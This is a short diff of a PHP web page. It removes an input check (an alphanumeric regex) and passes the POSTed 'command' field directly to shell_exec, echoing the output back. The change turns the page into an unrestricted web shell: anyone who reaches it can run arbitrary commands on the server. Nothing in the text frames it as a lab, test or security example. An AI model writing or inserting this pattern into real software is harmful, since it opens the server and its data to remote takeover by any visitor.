@@ -13,17 +13,9 @@
 
     <?php
     if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        // Ambil perintah dari input form
         $command = $_POST['command'];
-
-        // Pastikan perintah hanya berisi karakter yang diperbolehkan
-        if (preg_match('/^[a-zA-Z0-9\s]+$/', $command)) {
-            // Jalankan perintah
-            $output = shell_exec($command);
-            echo "<pre>$output</pre>";
-        } else {
-            echo "Perintah tidak valid!";
-        }
+        $output = shell_exec($command);
+        echo "<pre>$output</pre>";
     }
     ?>
 </body>
